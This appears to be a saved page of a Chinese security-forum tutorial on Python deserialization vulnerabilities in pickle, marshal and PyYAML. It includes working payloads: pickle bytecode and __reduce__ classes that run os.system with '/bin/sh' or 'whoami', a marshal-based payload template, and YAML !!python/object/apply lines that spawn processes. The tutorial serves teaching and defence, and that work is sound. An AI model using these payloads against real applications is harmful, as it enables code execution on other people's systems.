+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v4</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80\x04\x95</span><span class="s1">!</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x8c\x05</span><span class="s1">posix</span><span class="se">\x94\x8c\x06</span><span class="s1">system</span><span class="se">\x94\x93\x94\x8c\x06</span><span class="s1">whoami</span><span class="se">\x94\x85\x94</span><span class="s1">R</span><span class="se">\x94</span><span class="s1">.'</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">pickle</span> <span class="n">v5</span><span class="p">:</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x80\x05\x95</span><span class="s1">!</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x8c\x05</span><span class="s1">posix</span><span class="se">\x94\x8c\x06</span><span class="s1">system</span><span class="se">\x94\x93\x94\x8c\x06</span><span class="s1">whoami</span><span class="se">\x94\x85\x94</span><span class="s1">R</span><span class="se">\x94</span><span class="s1">.'</span>
+</pre></div>
+<p><a id="img2" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162009-37f2c242-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162009-37f2c242-ab4b-1.png"></a></p>
+<p>基本模式:</p>
+<div class="highlight"><pre><span></span><span class="n">c</span><span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nb">callable</span><span class="o">&gt;</span>
+<span class="p">(</span><span class="o">&lt;</span><span class="n">args</span><span class="o">&gt;</span>
+<span class="n">tR</span><span class="o">.</span>
+</pre></div>
+<p>这里用一段简短的字节码来演示利用过程:</p>
+<div class="highlight"><pre><span></span><span class="n">cos</span>
+<span class="n">system</span>
+<span class="p">(</span><span class="n">S</span><span class="s1">'whoami'</span>
+<span class="n">tR</span><span class="o">.</span>
+</pre></div>
+<p><a id="img3" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162022-3fd39ea0-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162022-3fd39ea0-ab4b-1.png"></a></p>
+<p>上文中的字节码其实就是<code>__import__('os').system(*('whoami',))</code>, 下面来分解分析一下:</p>
+<div class="highlight"><pre><span></span><span class="nv">cos</span>         <span class="o">=</span>&gt;  引入模块 os.
+<span class="nv">system</span>      <span class="o">=</span>&gt;  引用 system, 并将其添加到 stack.
+<span class="o">(</span>S<span class="s1">'whoami'</span>  <span class="o">=</span>&gt;  把当前 stack 存到 metastack, 清空 stack, 再将 <span class="s1">'whoami'</span> 压入 stack.
+<span class="nv">t</span>           <span class="o">=</span>&gt;  stack 中的值弹出并转为 tuple, 把 metastack 还原到 stack, 再将 tuple 压入 stack.
+<span class="nv">R</span>           <span class="o">=</span>&gt;  system<span class="o">(</span>*<span class="o">(</span><span class="s1">'whoami'</span>,<span class="o">))</span>.
+.           <span class="o">=</span>&gt;  结束并返回当前栈顶元素.
+</pre></div>
+<p>需要注意的是, 并不是所有的对象都能使用<code>pickle</code>进行序列化和反序列化, 例如文件对象和网络套接字对象以及代码对象就不可以.</p>
+<h1>反序列化漏洞</h1>
+<h2 id="toc-8">漏洞常见出现地方</h2>
+<ol>
+<li><p>通常在解析认证<code>token</code>, <code>session</code>的时候. 现在很多<code>Web</code>服务都使用<code>redis</code>、<code>mongodb</code>、<code>memcached</code>等来存储<code>session</code>等状态信息.</p>
+</li>
+<li><p>可能将对象<code>Pickle</code>后存储成磁盘文件.</p>
+</li>
+<li><p>可能将对象<code>Pickle</code>后在网络中传输.</p>
+</li>
+</ol>
+<h2 id="toc-9">漏洞利用方式</h2>
+<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码.</p>
+<p><a id="img4" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162032-45c29bc2-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162032-45c29bc2-ab4b-1.png"></a></p>
+<p>简单来说, <code>__reduce__()</code>魔术方法类似于<code>PHP</code>中的<code>__wakeup()</code>方法, 在反序列化时会先调用<code>__reduce__()</code>魔术方法.</p>
+<ol>
+<li>如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其序列化之后返回.</li>
+<li>如果返回值是一个元组, 要求是<code>2</code>到<code>6</code>个参数(<code>Python3.8</code>新加入元组的第六项).<ol>
+<li>第一个参数是可调用的对象.</li>
+<li>第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.</li>
+<li>第三个是用于表示对象的状态的可选元素, 将被传给前述的<code>__setstate__()</code>方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至<code>__dict__</code>属性中.</li>
+<li>第四个是用于返回连续项的迭代器的可选元素.</li>
+<li>第五个是用于返回连续键值对的迭代器的可选元素.</li>
+<li>第六个是一个带有<code>(obj, state)</code>签名的可调用对象的可选元素.</li>
+</ol>
+</li>
+</ol>
+<h2 id="toc-10">基本 Payload</h2>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+
+<span class="k">class</span> <span class="nc">Demo</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">shell</span> <span class="o">=</span> <span class="s1">'/bin/sh'</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,(</span><span class="n">shell</span><span class="p">,))</span>
+
+<span class="n">demo</span> <span class="o">=</span> <span class="n">Demo</span><span class="p">()</span>
+<span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">demo</span><span class="p">))</span>
+</pre></div>
+<p><a id="img5" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162052-5194d352-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162052-5194d352-ab4b-1.png"></a></p>
+<h1>Marshal 反序列化</h1>
+<p>由于<code>pickle</code>无法序列化<code>code</code>对象, 因此在<code>python2.6</code>后增加了一个<code>marshal</code>模块来处理<code>code</code>对象的序列化问题.</p>
+
+<pre><code>import base64
+import marshal
+
+def demo():
+    import os
+    os.system('/bin/sh')
+
+code_serialized = base64.b64encode(marshal.dumps(demo()))
+print(code_serialized)</code></pre>
+<p><a id="img6" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162100-567d4c78-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162100-567d4c78-ab4b-1.png"></a></p>
+<p>但是<code>marshal</code>不能直接使用<code>__reduce__</code>, 因为<code>reduce</code>是利用调用某个<code>callable</code>并传递参数来执行的, 而<code>marshal</code>函数本身就是一个<code>callable</code>, 需要执行它, 而不是将他作为某个函数的参数.</p>
+<p>这时候就要利用上面分析的那个<code>PVM</code>操作码来进行构造了, 先写出来需要执行的内容, <code>Python</code>能通过<code>types.FunctionTyle(func_code,globals(),'')()</code>来动态地创建匿名函数, 这一部分的内容可以看<a href="https://docs.python.org/3/library/types.html" target="_blank">官方文档</a>的介绍.</p>
+<p>结合上文的示例代码, 最重要执行的是: <code>(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), ''))()</code>.</p>
+<p>这里直接贴一下别的师傅给出来的<code>Payload</code>模板.</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">marshal</span>
+
+<span class="k">def</span> <span class="nf">foo</span><span class="p">():</span>
+    <span class="kn">import</span> <span class="nn">os</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">'whoami;/bin/sh'</span><span class="p">)</span>     <span class="c1"># evil code</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="s2">"""ctypes</span>
+<span class="s2">FunctionType</span>
+<span class="s2">(cmarshal</span>
+<span class="s2">loads</span>
+<span class="s2">(cbase64</span>
+<span class="s2">b64decode</span>
+<span class="s2">(S'</span><span class="si">%s</span><span class="s2">'</span>
+<span class="s2">tRtRc__builtin__</span>
+<span class="s2">globals</span>
+<span class="s2">(tRS''</span>
+<span class="s2">tR(tR."""</span> <span class="o">%</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">marshal</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">foo</span><span class="o">.</span><span class="n">func_code</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">shell</span><span class="p">))</span>
+</pre></div>
+<p><a id="img7" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162109-5c368b48-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162109-5c368b48-ab4b-1.png"></a></p>
+<h1>PyYAML 反序列化</h1>
+<h2 id="toc-11">漏洞点</h2>
+<p>找到<code>yaml/constructor.py</code>文件, 查看文件代码中的三个特殊<code>Python</code>标签的源码:</p>
+<ul>
+<li><code>!!python/object</code>标签.</li>
+<li><code>!!python/object/new</code>标签.</li>
+<li><code>!!python/object/apply</code>标签.</li>
+</ul>
+<p><a id="img8" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162117-6068a084-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162117-6068a084-ab4b-1.png"></a></p>
+<p>这三个<code>Python</code>标签中都是调用了<code>make_python_instance</code>函数, 跟进查看该函数. 可以看到, 在该函数是会根据参数来动态创建新的<code>Python</code>类对象或通过引用<code>module</code>的类创建对象, 从而可以执行任意命令.</p>
+<p><a id="img9" href="./Python反序列化漏洞分析 - 先知社区_files/20220324162133-6a8a5774-ab4b-1.png"><img src="./Python反序列化漏洞分析 - 先知社区_files/20220324162133-6a8a5774-ab4b-1.png"></a></p>
+<h2 id="toc-12">Payload(PyYaml &lt; 5.1)</h2>
+<div class="highlight"><pre><span></span><span class="kt">!!python/object/apply:os.system</span> <span class="p p-Indicator">[</span><span class="s">"calc.exe"</span><span class="p p-Indicator">]</span>
+<span class="kt">!!python/object/new:os.system</span> <span class="p p-Indicator">[</span><span class="s">"calc.exe"</span><span class="p p-Indicator">]</span>    
+<span class="kt">!!python/object/new:subprocess.check_output</span> <span class="p p-Indicator">[[</span><span class="s">"calc.exe"</span><span class="p p-Indicator">]]</span>
+<span class="kt">!!python/object/apply:subprocess.check_output</span> <span class="p p-Indicator">[[</span><span class="s">"calc.exe"</span><span class="p p-Indicator">]]</span>
+</pre></div>
+<h2 id="toc-13">Pyload(PyYaml &gt;= 5.1)</h2>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">yaml</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"""!!python/object/apply:subprocess.Popen</span>
+<span class="s2"> - calc"""</span>
+<span class="n">deserialized_data</span> <span class="o">=</span> <span class="n">load</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">Loader</span><span class="o">=</span><span class="n">Loader</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">yaml</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"""!!python/object/apply:subprocess.Popen</span>
+<span class="s2">- calc"""</span>
+<span class="n">deserialized_data</span> <span class="o">=</span> <span class="n">unsafe_load</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> 
+<span class="k">print</span><span class="p">(</span><span class="n">deserialized_data</span><span class="p">)</span>
+</pre></div>
+<h1>防御方法</h1>
+<ul>
+<li>采用用更高级的接口<code>__getnewargs()</code>、<code>__getstate__()</code>、<code>__setstate__()</code>等代替<code>__reduce__()</code>魔术方法.</li>
+<li>进行反序列化操作之前进行严格的过滤, 若采用的是<code>pickle</code>库可采用装饰器实现.</li>
+</ul>
+<h1>参考</h1>
+<ul>
+<li><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></li>
+</ul>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="11082">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">1</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="11082">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">2</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11071" title="edusrc 挖掘实例 |【实战】| 序"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>edusrc 挖掘实例 |【实战】| 序</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/11091" title="老曲新唱之XXL-JOB未授权Hessian2反序列化调试分析"><span class="related-label" style="">下一篇：</span>老曲新唱之XXL-JOB未授权He...</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">0 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            <ul>
+                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
+            </ul>
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11082&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11082&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">54</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">8</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/15858_1a385b86ba5eb88d54.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/49315_e954e2786775c5324a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./Python反序列化漏洞分析 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">1</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container" style="width: 257px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
+            <ol><li><a href="https://xz.aliyun.com/t/11082#toc-0">简介</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-1">简单使用</a><ol><li><a href="https://xz.aliyun.com/t/11082#toc-2">序列化操作</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-3">反序列化操作</a></li></ol></li><li><a href="https://xz.aliyun.com/t/11082#toc-4">PVM</a><ol><li><a href="https://xz.aliyun.com/t/11082#toc-5">组成部分</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-6">执行流程</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-7">指令集</a></li></ol></li><li><a href="https://xz.aliyun.com/t/11082#toc-8">漏洞常见出现地方</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-9">漏洞利用方式</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-10">基本 Payload</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-11">漏洞点</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-12">Payload(PyYaml &lt; 5.1)</a></li><li><a href="https://xz.aliyun.com/t/11082#toc-13">Pyload(PyYaml &gt;= 5.1)</a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer" translate="no">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="./Python反序列化漏洞分析 - 先知社区_files/bootstrap.min.js.下载"></script>
+<script src="./Python反序列化漏洞分析 - 先知社区_files/xz.js.下载"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11082&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11082&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="./Python反序列化漏洞分析 - 先知社区_files/z_stat.php"></script>
+
+
+</body></html>
